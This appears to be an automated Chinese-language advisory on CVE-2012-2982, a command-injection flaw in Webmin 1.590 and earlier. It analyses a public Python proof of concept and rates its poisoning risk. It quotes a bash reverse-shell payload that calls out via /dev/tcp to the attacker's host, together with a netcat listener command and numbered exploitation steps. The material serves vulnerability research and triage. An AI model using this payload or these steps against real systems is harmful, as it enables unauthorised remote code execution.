## CVE-2012-2982 - Webmin 命令注入/RCE

**漏洞编号:** CVE-2012-2982

**漏洞类型:** 命令注入/RCE

**影响应用:** Webmin

**危害等级:** CRITICAL

**CVSS评分:** 9.0

**影响版本:** 1.590及更早版本

**利用条件:** 需要有效的用户认证凭证（用户名和密码），且具有访问file/show.cgi权限

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 5%

## 详情

【POC有效性分析】该提供的Python代码是一个针对Webmin 1.590版本中存在的CVE-2012-2982漏洞的自动化利用脚本。漏洞核心在于/file/show.cgi处理路径名时，未能正确过滤无效字符，导致在执行外部二进制文件时可以注入任意系统命令。经过对POC代码的逻辑审查，该脚本首先通过session_login.cgi进行身份验证获取会话ID（sid）。一旦认证成功，它会构建一个包含管道符（|）的恶意URL，格式为/file/show.cgi/bin/[随机字符]|[Payload]|。脚本中生成的Payload是一个经典的Bash反弹Shell：'bash -c 'exec bash -i &>/dev/tcp/{lhost}/{lport}<&1''。当Webmin服务端尝试处理这个包含管道符的路径时，底层的Perl脚本会将管道符后的内容作为 shell 命令执行。此POC结构完整，包含了目标IP、本地监听地址、端口配置以及登录凭证字段，逻辑上与该历史漏洞的触发机制完全吻合，具有极高的实战有效性。利用步骤如下：1. 环境准备：确保攻击者机器已安装Python 3及requests库；2. 配置参数：在mal.py中填入targetIP（目标IP）、lhost（反弹回连IP）和lport（监听端口），并确保凭证字段中的用户名和密码正确；3. 开启监听：使用命令'nc -nlvp {lport}'开启本地监听；4. 执行脚本：运行'python mal.py'，脚本会自动获取会话并触发远程代码执行。如果目标环境存在漏洞且凭证正确，攻击者将获得一个交互式的Shell。 【投毒风险分析】该POC代码的投毒风险极低，评估为5%。风险主要源于用户在使用此类公开POC时通常倾向于直接以Root权限运行脚本。经过对脚本源码（mal.py）的逐行静态审计，未发现任何混淆代码、Base64加密的恶意Payload、意外的网络出站请求（除了指向targetIP和lhost的合法业务逻辑外）或对本地敏感文件（如~/.ssh/authorized_keys）的读写操作。脚本引用的是标准的string、secrets和requests库，没有引入第三方不可信依赖。README文件清晰地说明了使用方法和参数修改逻辑，透明度高。唯一需要注意的是，用户在测试时应手动替换默认的'user1'和'1user'测试账户，避免由于测试账户配置不当导致的行为异常。该代码属于典型的安全研究教育用途脚本，不包含恶意后门或针对研究人员主机的破坏性逻辑，但在生产环境测试前仍建议在隔离的沙箱或虚拟机中执行，以符合最佳安全实践。

**项目地址:** /tmp/vulnwatchdog_e91022ccfc0e16acbda0c049a97854b5/

**漏洞详情:** [https://nvd.nist.gov/vuln/detail/CVE-2012-2982](https://nvd.nist.gov/vuln/detail/CVE-2012-2982)
